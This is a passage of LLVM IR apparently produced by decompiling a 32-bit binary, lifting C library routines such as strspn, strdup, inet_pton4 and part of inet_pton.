dec_label_pc_80568cc:                             ; preds = %dec_label_pc_80568c4
  %v1_80568cc = add i32 %v0_80568a8, 2
  %v2_80568cf = inttoptr i32 %v1_80568cc to i8*
  %v3_80568cf = load i8, i8* %v2_80568cf, align 1
  %v16_80568cf = icmp eq i8 %v3_80568cf, %v4_8056888
  br i1 %v16_80568cf, label %dec_label_pc_80568dc, label %dec_label_pc_80568d4

dec_label_pc_80568d4:                             ; preds = %dec_label_pc_80568cc
  %v1_80568d4 = add i32 %v0_80568a8, 3
  %v2_80568d7 = inttoptr i32 %v1_80568d4 to i8*
  %v3_80568d7 = load i8, i8* %v2_80568d7, align 1
  %v16_80568d7 = icmp eq i8 %v3_80568d7, %v4_8056888
  %v1_80568da = icmp eq i1 %v16_80568d7, false
  br i1 %v1_80568da, label %dec_label_pc_80568a4, label %dec_label_pc_80568dc

dec_label_pc_80568dc:                             ; preds = %dec_label_pc_8056888, %dec_label_pc_80568d4, %dec_label_pc_80568cc, %dec_label_pc_80568c4, %dec_label_pc_80568bc
  %v0_80568de = phi i32 [ %v1_80568d4, %dec_label_pc_80568d4 ], [ %v1_80568cc, %dec_label_pc_80568cc ], [ %v1_80568c4, %dec_label_pc_80568c4 ], [ %v0_80568a8, %dec_label_pc_80568bc ], [ %v0_805688c, %dec_label_pc_8056888 ]
  store i32 %v0_805687d, i32* @ebx, align 4
  ret i32 %v0_80568de

; uselistorder directives
  uselistorder i32 %v1_80568b1, { 1, 0 }
  uselistorder i32 %v1_80568a8, { 2, 1, 0 }
  uselistorder i32 %v2_805689b, { 1, 0 }
  uselistorder i32 %v1_805688c, { 1, 0, 2 }
  uselistorder i32 %v4_8056882, { 2, 1, 0 }
  uselistorder i32 %v4_805687e, { 1, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80568dc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056891, { 1, 0 }
  uselistorder label %dec_label_pc_8056888, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_805690230 = load i8, i8* %arg1, align 1
  %v4_805690434 = icmp eq i8 %v2_805690230, 0
  br i1 %v4_805690434, label %dec_label_pc_805690c, label %dec_label_pc_8056908.lr.ph

dec_label_pc_8056908.lr.ph:                       ; preds = %entry
  %v3_805690231 = zext i8 %v2_805690230 to i32
  %v4_8056902.pre = load i32, i32* @eax, align 4
  %v5_805690232 = and i32 %v4_8056902.pre, -256
  %v6_805690233 = or i32 %v3_805690231, %v5_805690232
  %v4_80568e9 = ptrtoint i8* %arg1 to i32
  %v1_80568f418 = inttoptr i32 %arg2 to i8*
  %v4_80568f4.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056908

dec_label_pc_80568ef:                             ; preds = %dec_label_pc_8056908, %dec_label_pc_80568f3
  %v6_80568f427 = phi i32 [ %v6_80568f4, %dec_label_pc_80568f3 ], [ %v6_80568f422, %dec_label_pc_8056908 ]
  %v2_80568f426 = phi i8 [ %v2_80568f4, %dec_label_pc_80568f3 ], [ %v2_80568f419, %dec_label_pc_8056908 ]
  %v0_80568f325 = phi i32 [ %v1_80568f3, %dec_label_pc_80568f3 ], [ %arg2, %dec_label_pc_8056908 ]
  %v15_80568ef = icmp eq i8 %v2_805690237, %v2_80568f426
  br i1 %v15_80568ef, label %dec_label_pc_80568fc, label %dec_label_pc_80568f3

dec_label_pc_80568f3:                             ; preds = %dec_label_pc_80568ef
  %v1_80568f3 = add i32 %v0_80568f325, 1
  store i32 %v1_80568f3, i32* @edx, align 4
  %v1_80568f4 = inttoptr i32 %v1_80568f3 to i8*
  %v2_80568f4 = load i8, i8* %v1_80568f4, align 1
  %v3_80568f4 = zext i8 %v2_80568f4 to i32
  %v5_80568f4 = and i32 %v6_80568f427, -256
  %v6_80568f4 = or i32 %v3_80568f4, %v5_80568f4
  store i32 %v6_80568f4, i32* @ecx, align 4
  %v4_80568f6 = icmp eq i8 %v2_80568f4, 0
  %v1_80568f8 = icmp eq i1 %v4_80568f6, false
  br i1 %v1_80568f8, label %dec_label_pc_80568ef, label %dec_label_pc_805690c

dec_label_pc_80568fc:                             ; preds = %dec_label_pc_80568ef
  %v1_8056900 = add i32 %v0_805690c35, 1
  %v1_8056901 = add i32 %v0_805690136, 1
  %v1_8056902 = inttoptr i32 %v1_8056901 to i8*
  %v2_8056902 = load i8, i8* %v1_8056902, align 1
  %v3_8056902 = zext i8 %v2_8056902 to i32
  %v5_8056902 = and i32 %v6_805690238, -256
  %v6_8056902 = or i32 %v3_8056902, %v5_8056902
  %v4_8056904 = icmp eq i8 %v2_8056902, 0
  br i1 %v4_8056904, label %dec_label_pc_805690c, label %dec_label_pc_8056908

dec_label_pc_8056908:                             ; preds = %dec_label_pc_8056908.lr.ph, %dec_label_pc_80568fc
  %v4_80568f4.pre = phi i32 [ %v4_80568f4.pre.pre, %dec_label_pc_8056908.lr.ph ], [ %v6_80568f427, %dec_label_pc_80568fc ]
  %v6_805690238 = phi i32 [ %v6_805690233, %dec_label_pc_8056908.lr.ph ], [ %v6_8056902, %dec_label_pc_80568fc ]
  %v2_805690237 = phi i8 [ %v2_805690230, %dec_label_pc_8056908.lr.ph ], [ %v2_8056902, %dec_label_pc_80568fc ]
  %v0_805690136 = phi i32 [ %v4_80568e9, %dec_label_pc_8056908.lr.ph ], [ %v1_8056901, %dec_label_pc_80568fc ]
  %v0_805690c35 = phi i32 [ 0, %dec_label_pc_8056908.lr.ph ], [ %v1_8056900, %dec_label_pc_80568fc ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80568f419 = load i8, i8* %v1_80568f418, align 1
  %v3_80568f420 = zext i8 %v2_80568f419 to i32
  %v5_80568f421 = and i32 %v4_80568f4.pre, -256
  %v6_80568f422 = or i32 %v3_80568f420, %v5_80568f421
  store i32 %v6_80568f422, i32* @ecx, align 4
  %v4_80568f623 = icmp eq i8 %v2_80568f419, 0
  %v1_80568f824 = icmp eq i1 %v4_80568f623, false
  br i1 %v1_80568f824, label %dec_label_pc_80568ef, label %dec_label_pc_805690c

dec_label_pc_805690c:                             ; preds = %entry, %dec_label_pc_80568fc, %dec_label_pc_8056908, %dec_label_pc_80568f3
  %v0_805690c17 = phi i32 [ %v0_805690c35, %dec_label_pc_80568f3 ], [ %v0_805690c35, %dec_label_pc_8056908 ], [ 0, %entry ], [ %v1_8056900, %dec_label_pc_80568fc ]
  ret i32 %v0_805690c17

; uselistorder directives
  uselistorder i32 %v6_80568f422, { 1, 0 }
  uselistorder i8 %v2_80568f419, { 1, 2, 0 }
  uselistorder i32 %v1_8056901, { 1, 0 }
  uselistorder i32 %v6_80568f4, { 1, 0 }
  uselistorder i8 %v2_80568f4, { 1, 2, 0 }
  uselistorder i32 %v1_80568f3, { 2, 1, 0 }
  uselistorder i8 %v2_805690230, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805690c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8056908, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056914 = load i32, i32* @edi, align 4
  %v0_8056915 = load i32, i32* @esi, align 4
  %v0_8056916 = load i32, i32* @ebx, align 4
  store i32 %v0_8056916, i32* %stack_var_-12, align 4
  %v4_8056917 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056917, i32* @edi, align 4
  %v3_805691f = call i32 @strlen(i8* %arg1)
  %v1_8056924 = add i32 %v3_805691f, 1
  store i32 %v1_8056924, i32* @esi, align 4
  %v2_805692a = call i32 @malloc(i32 %v1_8056924)
  store i32 %v2_805692a, i32* %ebx.global-to-local, align 4
  %v1_8056934 = icmp eq i32 %v2_805692a, 0
  br i1 %v1_8056934, label %dec_label_pc_8056944, label %dec_label_pc_8056938

dec_label_pc_8056938:                             ; preds = %entry
  %v0_8056939 = load i32, i32* @esi, align 4
  %v0_805693a = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_805692a to i16*
  %v6_805693c = call i32 @memcpy(i16* %tmp11, i32 %v0_805693a, i32 %v0_8056939)
  %v0_8056944.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056944

dec_label_pc_8056944:                             ; preds = %entry, %dec_label_pc_8056938
  %v0_8056944 = phi i32 [ 0, %entry ], [ %v0_8056944.pre, %dec_label_pc_8056938 ]
  %v2_8056946 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056946, i32* @ebx, align 4
  store i32 %v0_8056915, i32* @esi, align 4
  store i32 %v0_8056914, i32* @edi, align 4
  ret i32 %v0_8056944

; uselistorder directives
  uselistorder i32 %v2_805692a, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 10, 7, 6, 17, 16, 15, 1, 9, 8, 14, 13, 4, 12, 11, 5, 3, 2, 0 }
  uselistorder label %dec_label_pc_8056944, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805694e = load i32, i32* @esi, align 4
  %v0_8056955 = load i32, i32* @eax, align 4
  store i32 %v0_8056955, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805695b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805695b, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80569a315 = inttoptr i32 %v0_8056955 to i8*
  %v2_80569a316 = load i8, i8* %v1_80569a315, align 1
  %v3_80569a317 = sext i8 %v2_80569a316 to i32
  store i32 %v3_80569a317, i32* @ecx, align 4
  %v1_80569a618 = add i32 %v0_8056955, 1
  store i32 %v1_80569a618, i32* %ebx.global-to-local, align 4
  %v1_80569a719 = icmp eq i8 %v2_80569a316, 0
  %v1_80569a920 = icmp eq i1 %v1_80569a719, false
  br i1 %v1_80569a920, label %dec_label_pc_8056966, label %dec_label_pc_80569ab.thread

dec_label_pc_80569ab.thread:                      ; preds = %entry
  br label %dec_label_pc_80569c8

dec_label_pc_8056966:                             ; preds = %entry, %dec_label_pc_80569a3.backedge
  %v3_80569a322 = phi i32 [ %v3_80569a3, %dec_label_pc_80569a3.backedge ], [ %v3_80569a317, %entry ]
  %v2_80569a321 = phi i8 [ %v2_80569a3, %dec_label_pc_80569a3.backedge ], [ %v2_80569a316, %entry ]
  %v1_8056966 = add nsw i32 %v3_80569a322, -48
  store i32 %v1_8056966, i32* %eax.global-to-local, align 4
  %v6_805696c = icmp ugt i32 %v1_8056966, 9
  br i1 %v6_805696c, label %dec_label_pc_805698f, label %dec_label_pc_805696e

dec_label_pc_805696e:                             ; preds = %dec_label_pc_8056966
  %v0_805696e = load i32, i32* @esi, align 4
  %v1_805696e = inttoptr i32 %v0_805696e to i8*
  %v2_805696e = load i8, i8* %v1_805696e, align 1
  %v2_8056971 = zext i8 %v2_805696e to i32
  %v3_8056971 = mul nuw nsw i32 %v2_8056971, 10
  %v3_8056974 = add nsw i32 %v3_8056971, %v1_8056966
  store i32 %v3_8056974, i32* %eax.global-to-local, align 4
  %v6_805697d = icmp ugt i32 %v3_8056974, 255
  br i1 %v6_805697d, label %dec_label_pc_80569c8, label %dec_label_pc_805697f

dec_label_pc_805697f:                             ; preds = %dec_label_pc_805696e
  %v1_805697f = trunc i32 %v3_8056974 to i8
  store i8 %v1_805697f, i8* %v1_805696e, align 1
  %v0_8056981 = load i32, i32* @edx, align 4
  %v1_8056981 = icmp eq i32 %v0_8056981, 0
  %v1_8056983 = icmp eq i1 %v1_8056981, false
  br i1 %v1_8056983, label %dec_label_pc_80569a3.backedge, label %dec_label_pc_8056985

dec_label_pc_8056985:                             ; preds = %dec_label_pc_805697f
  %v0_8056985 = load i32, i32* @edi, align 4
  %v1_8056985 = add i32 %v0_8056985, 1
  store i32 %v1_8056985, i32* @edi, align 4
  %v1_8056986 = add i32 %v0_8056985, -3
  %v6_8056986 = sub i32 2, %v0_8056985
  %v7_8056986 = and i32 %v6_8056986, %v1_8056985
  %v8_8056986 = icmp slt i32 %v7_8056986, 0
  %v9_8056986 = icmp eq i32 %v1_8056986, 0
  %v10_8056986 = icmp slt i32 %v1_8056986, 0
  %v3_8056989 = icmp eq i1 %v10_8056986, %v8_8056986
  %v4_8056989 = icmp eq i1 %v9_8056986, false
  %v5_8056989 = and i1 %v4_8056989, %v3_8056989
  br i1 %v5_8056989, label %dec_label_pc_80569c8, label %dec_label_pc_805698b

dec_label_pc_805698b:                             ; preds = %dec_label_pc_8056985
  %v1_805698b = and i32 %v0_8056981, -256
  %v2_805698b = or i32 %v1_805698b, 1
  store i32 %v2_805698b, i32* @edx, align 4
  br label %dec_label_pc_80569a3.backedge

dec_label_pc_805698f:                             ; preds = %dec_label_pc_8056966
  %v9_805698f = icmp eq i8 %v2_80569a321, 46
  %v1_8056992 = icmp eq i1 %v9_805698f, false
  br i1 %v1_8056992, label %dec_label_pc_80569c8, label %dec_label_pc_8056994

dec_label_pc_8056994:                             ; preds = %dec_label_pc_805698f
  %v0_8056994 = load i32, i32* @edx, align 4
  %v1_8056994 = icmp eq i32 %v0_8056994, 0
  br i1 %v1_8056994, label %dec_label_pc_80569c8, label %dec_label_pc_8056998

dec_label_pc_8056998:                             ; preds = %dec_label_pc_8056994
  %v0_8056998 = load i32, i32* @edi, align 4
  %v9_8056998 = icmp eq i32 %v0_8056998, 4
  br i1 %v9_8056998, label %dec_label_pc_80569c8, label %dec_label_pc_805699d

dec_label_pc_805699d:                             ; preds = %dec_label_pc_8056998
  %v0_805699d = load i32, i32* @esi, align 4
  %v1_805699d = add i32 %v0_805699d, 1
  store i32 %v1_805699d, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80569a0 = inttoptr i32 %v1_805699d to i8*
  store i8 0, i8* %v1_80569a0, align 1
  br label %dec_label_pc_80569a3.backedge

dec_label_pc_80569a3.backedge:                    ; preds = %dec_label_pc_805699d, %dec_label_pc_805698b, %dec_label_pc_805697f
  %v0_80569a3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80569a3 = inttoptr i32 %v0_80569a3.pre to i8*
  %v2_80569a3 = load i8, i8* %v1_80569a3, align 1
  %v3_80569a3 = sext i8 %v2_80569a3 to i32
  store i32 %v3_80569a3, i32* @ecx, align 4
  %v1_80569a6 = add i32 %v0_80569a3.pre, 1
  store i32 %v1_80569a6, i32* %ebx.global-to-local, align 4
  %v1_80569a7 = icmp eq i8 %v2_80569a3, 0
  %v1_80569a9 = icmp eq i1 %v1_80569a7, false
  br i1 %v1_80569a9, label %dec_label_pc_8056966, label %dec_label_pc_80569ab

dec_label_pc_80569ab:                             ; preds = %dec_label_pc_80569a3.backedge
  %v0_80569ab.pre = load i32, i32* @edi, align 4
  %v7_80569ae = icmp sgt i32 %v0_80569ab.pre, 3
  br i1 %v7_80569ae, label %dec_label_pc_80569b0, label %dec_label_pc_80569c8

dec_label_pc_80569b0:                             ; preds = %dec_label_pc_80569ab
  %v0_80569b0 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_805695b, i32* %eax.global-to-local, align 4
  %v3_80569b9 = bitcast i32* %stack_var_-20 to i16*
  %v4_80569b9 = call i32 @memcpy(i16* %v3_80569b9, i32 4, i32 %v0_80569b0)
  br label %dec_label_pc_80569ca

dec_label_pc_80569c8:                             ; preds = %dec_label_pc_8056998, %dec_label_pc_8056994, %dec_label_pc_805698f, %dec_label_pc_8056985, %dec_label_pc_805696e, %dec_label_pc_80569ab.thread, %dec_label_pc_80569ab
  br label %dec_label_pc_80569ca

dec_label_pc_80569ca:                             ; preds = %dec_label_pc_80569b0, %dec_label_pc_80569c8
  %storemerge = phi i32 [ 0, %dec_label_pc_80569c8 ], [ 1, %dec_label_pc_80569b0 ]
  %v0_80569d1 = phi i32 [ 0, %dec_label_pc_80569c8 ], [ 1, %dec_label_pc_80569b0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805694e, i32* @esi, align 4
  ret i32 %v0_80569d1

; uselistorder directives
  uselistorder i32 %v3_80569a3, { 1, 0 }
  uselistorder i8 %v2_80569a3, { 1, 2, 0 }
  uselistorder i32 %v1_8056986, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80569ca, { 1, 0 }
  uselistorder label %dec_label_pc_80569c8, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8056966, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80569d2 = load i32, i32* @ebp, align 4
  %v0_80569d3 = load i32, i32* @edi, align 4
  %v0_80569d4 = load i32, i32* @esi, align 4
  %v0_80569d5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80569dd = ptrtoint i8* %arg2 to i32
  store i32 %v4_80569dd, i32* @edi, align 4
  %v9_80569e1 = icmp eq i32 %arg1, 2
  br i1 %v9_80569e1, label %dec_label_pc_80569f1, label %dec_label_pc_80569e6

dec_label_pc_80569e6:                             ; preds = %entry
  %v9_80569e6 = icmp eq i32 %arg1, 10
  %v1_80569e9 = icmp eq i1 %v9_80569e6, false
  br i1 %v1_80569e9, label %dec_label_pc_8056b82, label %dec_label_pc_8056a01

dec_label_pc_80569f1:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80569dd, i32* @eax, align 4
  %v3_80569f7 = call i32 @inet_pton4(i32 %v0_80569d5, i32 %v0_80569d4, i32 %v0_80569d3)
  store i32 %v3_80569f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056b94

dec_label_pc_8056a01:                             ; preds = %dec_label_pc_80569e6
  %v2_8056a06 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056a06, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8056a0b = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8056a0b, i32* @ebx, align 4
  %v2_8056a12 = add i32 %v5_8056a0b, 16
  store i32 %v2_8056a12, i32* %eax.global-to-local, align 4
  %v0_8056a1c = load i32, i32* @edi, align 4
  %v1_8056a1c = inttoptr i32 %v0_8056a1c to i8*
  %v2_8056a1c = load i8, i8* %v1_8056a1c, align 1
  %v11_8056a1c = icmp eq i8 %v2_8056a1c, 58
  %v1_8056a1f = icmp eq i1 %v11_8056a1c, false
  br i1 %v1_8056a1f, label %dec_label_pc_8056ab2, label %dec_label_pc_8056a21

dec_label_pc_8056a21:                             ; preds = %dec_label_pc_8056a01
  %v1_8056a21 = add i32 %v0_8056a1c, 1
  store i32 %v1_8056a21, i32* @edi, align 4
  %v1_8056a22 = inttoptr i32 %v1_8056a21 to i8*
  %v2_8056a22 = load i8, i8* %v1_8056a22, align 1
  %v11_8056a22 = icmp eq i8 %v2_8056a22, 58
  %v1_8056a25 = icmp eq i1 %v11_8056a22, false
  br i1 %v1_8056a25, label %dec_label_pc_8056b92, label %dec_label_pc_8056ab2

dec_label_pc_8056a39:                             ; preds = %dec_label_pc_8056af2
  %v4_8056a41 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805ab34.572, i32 0, i32 0), i32 %v2_8056af9)
  store i32 %v4_8056a41, i32* %eax.global-to-local, align 4
  %v0_8056a46 = load i32, i32* @edi, align 4
  %v1_8056a46 = add i32 %v0_8056a46, 1
  store i32 %v1_8056a46, i32* @edi, align 4
  %v1_8056a4a = icmp eq i32 %v4_8056a41, 0
  br i1 %v1_8056a4a, label %dec_label_pc_8056a69, label %dec_label_pc_8056a4e

dec_label_pc_8056a4e:                             ; preds = %dec_label_pc_8056a39
  %v0_8056a4e = load i32, i32* @ebp, align 4
  %v2_8056a4e = mul i32 %v0_8056a4e, 16
  %v1_8056a51 = add i32 %v4_8056a41, -134589236
  store i32 %v1_8056a51, i32* %eax.global-to-local, align 4
  %v2_8056a56 = or i32 %v2_8056a4e, %v1_8056a51
  store i32 %v2_8056a56, i32* @ebp, align 4
  %tmp126 = icmp ult i32 %v2_8056a56, 65536
  br i1 %tmp126, label %dec_label_pc_8056af2.outer, label %dec_label_pc_8056b92

dec_label_pc_8056af2.outer:                       ; preds = %dec_label_pc_8056a4e, %dec_label_pc_8056ab2
  %v0_8056af536 = phi i32 [ %v1_8056a46, %dec_label_pc_8056a4e ], [ %stack_var_-36.0.in, %dec_label_pc_8056ab2 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8056a4e ], [ %stack_var_-44.0, %dec_label_pc_8056ab2 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8056a4e ], [ %stack_var_-36.0, %dec_label_pc_8056ab2 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8056a4e ], [ 0, %dec_label_pc_8056ab2 ]
  %v4_8056a6e = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8056a73 = icmp eq i1 %v4_8056a6e, false
  br label %dec_label_pc_8056af2

dec_label_pc_8056a69:                             ; preds = %dec_label_pc_8056a39
  %v0_8056a69 = load i32, i32* @esi, align 4
  %v9_8056a69 = icmp eq i32 %v0_8056a69, 58
  %v1_8056a6c = icmp eq i1 %v9_8056a69, false
  br i1 %v1_8056a6c, label %dec_label_pc_8056abe, label %dec_label_pc_8056a6e

dec_label_pc_8056a6e:                             ; preds = %dec_label_pc_8056a69
  br i1 %v1_8056a73, label %dec_label_pc_8056a8a, label %dec_label_pc_8056a75

dec_label_pc_8056a75:                             ; preds = %dec_label_pc_8056a6e
  %v5_8056a75 = icmp eq i8* %stack_var_-44.1, null
  %v1_8056a7a = icmp eq i1 %v5_8056a75, false
  br i1 %v1_8056a7a, label %dec_label_pc_8056b92, label %dec_label_pc_8056a80

dec_label_pc_8056a80:                             ; preds = %dec_label_pc_8056a75
  %v0_8056a80 = load i32, i32* @ebx, align 4
  %v5_8056a80 = inttoptr i32 %v0_8056a80 to i8*
  %v5_8056a84 = inttoptr i32 %v1_8056a46 to i8*
  br label %dec_label_pc_8056af2

dec_label_pc_8056a8a:                             ; preds = %dec_label_pc_8056a6e
  %v1_8056a8a = inttoptr i32 %v1_8056a46 to i8*
  %v2_8056a8a = load i8, i8* %v1_8056a8a, align 1
  %v3_8056a8a = icmp eq i8 %v2_8056a8a, 0
  br i1 %v3_8056a8a, label %dec_label_pc_8056b92, label %dec_label_pc_8056a93

dec_label_pc_8056a93:                             ; preds = %dec_label_pc_8056a8a
  %v0_8056a93 = load i32, i32* @ebx, align 4
  %v1_8056a93 = add i32 %v0_8056a93, 2
  store i32 %v1_8056a93, i32* @edx, align 4
  %v6_8056a9a = icmp ugt i32 %v1_8056a93, %v2_8056a12
  br i1 %v6_8056a9a, label %dec_label_pc_8056b92, label %dec_label_pc_8056aa0

dec_label_pc_8056aa0:                             ; preds = %dec_label_pc_8056a93
  %v0_8056aa0 = load i32, i32* @ebp, align 4
  %v2_8056aa2 = udiv i32 %v0_8056aa0, 256
  %v4_8056aa2 = trunc i32 %v2_8056aa2 to i8
  %v3_8056aa5 = inttoptr i32 %v0_8056a93 to i8*
  store i8 %v4_8056aa2, i8* %v3_8056aa5, align 1
  %v0_8056aa7 = load i32, i32* @ebp, align 4
  store i32 %v0_8056aa7, i32* %eax.global-to-local, align 4
  %v1_8056aa9 = trunc i32 %v0_8056aa7 to i8
  %v2_8056aa9 = load i32, i32* @ebx, align 4
  %v3_8056aa9 = add i32 %v2_8056aa9, 1
  %v4_8056aa9 = inttoptr i32 %v3_8056aa9 to i8*
  store i8 %v1_8056aa9, i8* %v4_8056aa9, align 1
  %v0_8056aac = load i32, i32* @edx, align 4
  store i32 %v0_8056aac, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056ab2

dec_label_pc_8056ab2:                             ; preds = %dec_label_pc_8056a01, %dec_label_pc_8056a21, %dec_label_pc_8056aa0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8056aa0 ], [ %v1_8056a21, %dec_label_pc_8056a21 ], [ %v0_8056a1c, %dec_label_pc_8056a01 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8056aa0 ], [ null, %dec_label_pc_8056a21 ], [ null, %dec_label_pc_8056a01 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8056af2.outer

dec_label_pc_8056abe:                             ; preds = %dec_label_pc_8056a69
  %v9_8056abe = icmp eq i32 %v0_8056a69, 46
  %v1_8056ac1 = icmp eq i1 %v9_8056abe, false
  br i1 %v1_8056ac1, label %dec_label_pc_8056b92, label %dec_label_pc_8056ac7

dec_label_pc_8056ac7:                             ; preds = %dec_label_pc_8056abe
  %v0_8056ac7 = load i32, i32* @ebx, align 4
  %v1_8056ac7 = add i32 %v0_8056ac7, 4
  store i32 %v1_8056ac7, i32* @esi, align 4
  %v6_8056ace = icmp ugt i32 %v1_8056ac7, %v2_8056a12
  br i1 %v6_8056ace, label %dec_label_pc_8056b92, label %dec_label_pc_8056ad4

dec_label_pc_8056ad4:                             ; preds = %dec_label_pc_8056ac7
  store i32 %v0_8056ac7, i32* @edx, align 4
  %v4_8056ad6 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8056ad6, i32* @eax, align 4
  %v2_8056ada = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056ada = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8056ada, i32 %v2_8056a12)
  store i32 %v5_8056ada, i32* %eax.global-to-local, align 4
  %v0_8056adf = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_8056ada, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8056b29, label %dec_label_pc_8056b92

dec_label_pc_8056af2:                             ; preds = %dec_label_pc_8056af2.outer, %dec_label_pc_8056a80
  %v0_8056af5 = phi i32 [ %v1_8056a46, %dec_label_pc_8056a80 ], [ %v0_8056af536, %dec_label_pc_8056af2.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8056a80, %dec_label_pc_8056a80 ], [ %stack_var_-44.1.ph, %dec_label_pc_8056af2.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8056a84, %dec_label_pc_8056a80 ], [ %stack_var_-36.1.ph, %dec_label_pc_8056af2.outer ]
  %v1_8056af5 = inttoptr i32 %v0_8056af5 to i8*
  %v2_8056af5 = load i8, i8* %v1_8056af5, align 1
  %v3_8056af5 = sext i8 %v2_8056af5 to i32
  store i32 %v3_8056af5, i32* %eax.global-to-local, align 4
  %v2_8056af9 = call i32 @__GI_tolower(i32 %v3_8056af5)
  store i32 %v2_8056af9, i32* %eax.global-to-local, align 4
  store i32 %v2_8056af9, i32* @esi, align 4
  %v1_8056b03 = icmp eq i32 %v2_8056af9, 0
  %v1_8056b05 = icmp eq i1 %v1_8056b03, false
  br i1 %v1_8056b05, label %dec_label_pc_8056a39, label %dec_label_pc_8056b0b

dec_label_pc_8056b0b:                             ; preds = %dec_label_pc_8056af2
  %v0_8056b61.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_8056a6e, label %dec_label_pc_8056b29, label %dec_label_pc_8056b12

dec_label_pc_8056b12:                             ; preds = %dec_label_pc_8056b0b
  %v1_8056b12 = add i32 %v0_8056b61.pre.pre, 2
  store i32 %v1_8056b12, i32* @edx, align 4
  %v6_8056b19 = icmp ugt i32 %v1_8056b12, %v2_8056a12
  br i1 %v6_8056b19, label %dec_label_pc_8056b92, label %dec_label_pc_8056b1b

dec_label_pc_8056b1b:                             ; preds = %dec_label_pc_8056b12
  %v0_8056b1b = load i32, i32* @ebp, align 4
  %v2_8056b1d = udiv i32 %v0_8056b1b, 256
  %v4_8056b1d = trunc i32 %v2_8056b1d to i8
  %v3_8056b20 = inttoptr i32 %v0_8056b61.pre.pre to i8*
  store i8 %v4_8056b1d, i8* %v3_8056b20, align 1
  %v0_8056b22 = load i32, i32* @ebp, align 4
  store i32 %v0_8056b22, i32* %eax.global-to-local, align 4
  %v1_8056b24 = trunc i32 %v0_8056b22 to i8
  %v2_8056b24 = load i32, i32* @ebx, align 4
  %v3_8056b24 = add i32 %v2_8056b24, 1
  %v4_8056b24 = inttoptr i32 %v3_8056b24 to i8*
  store i8 %v1_8056b24, i8* %v4_8056b24, align 1
  %v0_8056b27 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8056b29

dec_label_pc_8056b29:                             ; preds = %dec_label_pc_8056b0b, %dec_label_pc_8056ad4, %dec_label_pc_8056b1b
  %v0_8056b61.pre = phi i32 [ %v0_8056adf, %dec_label_pc_8056ad4 ], [ %v0_8056b27, %dec_label_pc_8056b1b ], [ %v0_8056b61.pre.pre, %dec_label_pc_8056b0b ]
